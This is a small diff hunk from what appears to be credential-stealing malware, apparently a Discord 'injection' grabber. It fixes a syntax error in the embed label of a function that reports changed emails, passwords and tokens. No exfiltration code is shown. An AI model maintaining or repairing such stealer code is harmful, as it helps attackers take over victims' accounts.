@@ -730,7 +730,7 @@ const emailChanged = async (email, password, token) => {
           }
         ],
         author: {
-          name: 'Mediant Injection Info,
+          name: 'Mediant Injection Info',
           icon_url: 'https://raw.githubusercontent.com/The-Mediant/lagnewalisui/main/img/xd.jpg',
         },
         footer: {
